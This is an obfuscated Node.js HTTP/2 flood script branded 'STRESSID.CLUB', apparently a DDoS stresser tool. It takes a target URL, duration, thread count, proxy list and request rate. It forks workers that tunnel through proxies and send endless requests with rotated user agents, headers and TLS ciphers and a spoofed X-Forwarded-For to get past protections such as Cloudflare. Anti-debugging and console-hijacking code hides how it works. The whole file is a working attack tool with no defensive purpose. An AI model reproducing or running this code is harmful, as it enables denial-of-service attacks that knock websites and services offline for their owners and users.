var _0xc61b9f = (function () {
    var _0x14dd9a = true
    return function (_0x1c2d64, _0xf92252) {
      var _0x33ecfe = _0x14dd9a
        ? function () {
            if (_0xf92252) {
              var _0x103883 = _0xf92252.apply(_0x1c2d64, arguments)
              return (_0xf92252 = null), _0x103883
            }
          }
        : function () {}
      return (_0x14dd9a = false), _0x33ecfe
    }
  })(),
  _0x4099d5 = _0xc61b9f(this, function () {
    return _0x4099d5
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x4099d5)
      .search('(((.+)+)+)+$')
  })
_0x4099d5()
var _0x563124 = (function () {
  var _0x4ddfb0 = true
  return function (_0x3f1841, _0x57f177) {
    var _0x46eab9 = _0x4ddfb0
      ? function () {
          if (_0x57f177) {
            var _0xf2b1be = _0x57f177.apply(_0x3f1841, arguments)
            return (_0x57f177 = null), _0xf2b1be
          }
        }
      : function () {}
    return (_0x4ddfb0 = false), _0x46eab9
  }
})()
;(function () {
  _0x563124(this, function () {
    var _0x5850cc = new RegExp('function *\\( *\\)'),
      _0x33ea0b = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x5b4489 = _0x434d35('init')
    if (
      !_0x5850cc.test(_0x5b4489 + 'chain') ||
      !_0x33ea0b.test(_0x5b4489 + 'input')
    ) {
      _0x5b4489('0')
    } else {
      _0x434d35()
    }
  })()
})()
var _0x516915 = (function () {
    var _0x1df6e4 = true
    return function (_0xfa77a1, _0x41653b) {
      var _0x493a92 = _0x1df6e4
        ? function () {
            if (_0x41653b) {
              var _0x37b77c = _0x41653b.apply(_0xfa77a1, arguments)
              return (_0x41653b = null), _0x37b77c
            }
          }
        : function () {}
      return (_0x1df6e4 = false), _0x493a92
    }
  })(),
  _0x28229f = _0x516915(this, function () {
    var _0x6bfcec = function () {
      var _0x3298db
      try {
        _0x3298db = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x544db6) {
        _0x3298db = window
      }
      return _0x3298db
    }
    var _0x33d5fc = _0x6bfcec()
    var _0x43d050 = (_0x33d5fc.console = _0x33d5fc.console || {}),
      _0x38ad70 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (var _0xa4b13e = 0; _0xa4b13e < _0x38ad70.length; _0xa4b13e++) {
      var _0x520464 = _0x516915.constructor.prototype.bind(_0x516915)
      var _0x5a7d34 = _0x38ad70[_0xa4b13e]
      var _0x501cbc = _0x43d050[_0x5a7d34] || _0x520464
      _0x520464['__proto__'] = _0x516915.bind(_0x516915)
      _0x520464.toString = _0x501cbc.toString.bind(_0x501cbc)
      _0x43d050[_0x5a7d34] = _0x520464
    }
  })
_0x28229f()
const url = require('url'),
  fs = require('fs'),
  http2 = require('http2'),
  http = require('http'),
  tls = require('tls'),
  net = require('net'),
  cluster = require('cluster'),
  cplist = [
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  ],
  accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  ],
  lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
  ],
  encoding_header = ['deflate, gzip;q=1.0, *;q=0.5', 'gzip, deflate, br', '*'],
  controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
  ],
  ignoreNames = [
    'RequestError',
    'StatusCodeError',
    'CaptchaError',
    'CloudflareError',
    'ParseError',
    'ParserError',
  ],
  ignoreCodes = [
    'SELF_SIGNED_CERT_IN_CHAIN',
    'ECONNRESET',
    'ERR_ASSERTION',
    'ECONNREFUSED',
    'EPIPE',
    'EHOSTUNREACH',
    'ETIMEDOUT',
    'ESOCKETTIMEDOUT',
    'EPROTO',
  ]
process
  .on('uncaughtException', function (_0x8fca03) {
    if (
      (_0x8fca03.code && ignoreCodes.includes(_0x8fca03.code)) ||
      (_0x8fca03.name && ignoreNames.includes(_0x8fca03.name))
    ) {
      return false
    }
  })
  .on('unhandledRejection', function (_0x20b40e) {
    if (
      (_0x20b40e.code && ignoreCodes.includes(_0x20b40e.code)) ||
      (_0x20b40e.name && ignoreNames.includes(_0x20b40e.name))
    ) {
      return false
    }
  })
  .on('warning', (_0x3dd6bf) => {
    if (
      (_0x3dd6bf.code && ignoreCodes.includes(_0x3dd6bf.code)) ||
      (_0x3dd6bf.name && ignoreNames.includes(_0x3dd6bf.name))
    ) {
      return false
    }
  })
  .setMaxListeners(0)
function accept() {
  return accept_header[Math.floor(Math.random() * accept_header.length)]
}
function lang() {
  return lang_header[Math.floor(Math.random() * lang_header.length)]
}
function encoding() {
  return encoding_header[Math.floor(Math.random() * encoding_header.length)]
}
function controling() {
  return controle_header[Math.floor(Math.random() * controle_header.length)]
}
;(function () {
  var _0x26430e = function () {
      var _0x3a195e
      try {
        _0x3a195e = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x379fec) {
        _0x3a195e = window
      }
      return _0x3a195e
    },
    _0x7b7bb0 = _0x26430e()
  _0x7b7bb0.setInterval(_0x434d35, 4000)
})()
function cipher() {
  return cplist[Math.floor(Math.random() * cplist.length)]
}
process.argv.length < 7 &&
  (console.log('OWNER: STRESSID.CLUB'),
  console.log('target time thread proxy ratelimit mode'),
  process.exit(0))
const target = process.argv[2],
  time = process.argv[3],
  thread = process.argv[4],
  proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g)
var rate = process.argv[6],
  getpost = process.argv[7],
  useragentsss = fs
    .readFileSync('ua.txt', 'utf-8')
    .replace(/\r/g, '')
    .split('\n')
function proxyr() {
  return proxys[Math.floor(Math.random() * proxys.length)]
}
if (cluster.isMaster) {
  const dateObj = new Date()
  console.log('OWNER: STRESSID.CLUB | Attack started. ')
  for (var bb = 0; bb < thread; bb++) {
    cluster.fork()
  }
  setTimeout(() => {
    process.exit(-1)
  }, time * 1000)
} else {
  function flood() {
    var _0x4c8d80 = url.parse(target)
    const _0xdcf247 =
      useragentsss[Math.floor(Math.random() * useragentsss.length)]
    var _0x3ab337 = cipher(),
      _0x12ee00 = proxyr().split(':'),
      _0x1dc04b = {
        ':path': _0x4c8d80.path,
        'X-Forwarded-For': _0x12ee00[0],
        'X-Forwarded-Host': _0x12ee00[0],
        ':method': getpost,
        'User-agent': _0xdcf247,
        Origin: target,
        Accept: accept(),
        'Accept-Encoding': encoding(),
        'Accept-Language': lang(),
        'Cache-Control': controling(),
      },
      _0x2e0412 = {
        keepAlive: true,
        keepAliveMsecs: 3500,
        maxSockets: 0,
      }
    const _0x4159eb = new http.Agent(_0x2e0412)
    var _0x1fcd64 = {
      Host: _0x4c8d80.host,
      Connection: 'Keep-Alive',
    }
    _0x1fcd64['Proxy-Connection'] = 'Keep-Alive'
    var _0x391c58 = {
      host: _0x12ee00[0],
      agent: _0x4159eb,
      globalAgent: _0x4159eb,
      port: _0x12ee00[1],
      headers: _0x1fcd64,
      method: 'CONNECT',
      path: _0x4c8d80.host,
    }
    var _0x4c405f = http.request(_0x391c58, function () {
      _0x4c405f.setSocketKeepAlive(true)
    })
    _0x4c405f.on('connect', function (_0x62a3fa, _0x4696f5, _0x19b73b) {
      const _0x9852dc = http2.connect(_0x4c8d80.href, {
        createConnection: () =>
          tls.connect(
            {
              host: _0x4c8d80.host,
              ciphers: _0x3ab337,
              secureProtocol: 'TLS_method',
              TLS_MAX_VERSION: '1.3',
              servername: _0x4c8d80.host,
              secure: true,
              rejectUnauthorized: false,
              ALPNProtocols: ['h2'],
              socket: _0x4696f5,
            },
            function () {
              for (let _0x197fcb = 0; _0x197fcb < rate; _0x197fcb++) {
                const _0x57302c = _0x9852dc.request(_0x1dc04b)
                _0x57302c.setEncoding('utf8')
                _0x57302c.on('data', (_0x59ae48) => {
                  data += _0x59ae48
                })
                _0x57302c.on('response', () => {
                  _0x57302c.close()
                })
                _0x57302c.end()
              }
            }
          ),
      })
    })
    _0x4c405f.end()
  }
  setInterval(() => {
    flood()
  })
}
function _0x434d35(_0xc8635d) {
  function _0x4e5484(_0x5b1f45) {
    if (typeof _0x5b1f45 === 'string') {
      return function (_0x1ed393) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      if (('' + _0x5b1f45 / _0x5b1f45).length !== 1 || _0x5b1f45 % 20 === 0) {
        ;(function () {
          return true
        }
          .constructor('debugger')
          .call('action'))
      } else {
        ;(function () {
          return false
        }
          .constructor('debugger')
          .apply('stateObject'))
      }
    }
    _0x4e5484(++_0x5b1f45)
  }
  try {
    if (_0xc8635d) {
      return _0x4e5484
    } else {
      _0x4e5484(0)
    }
  } catch (_0x36a190) {}
}
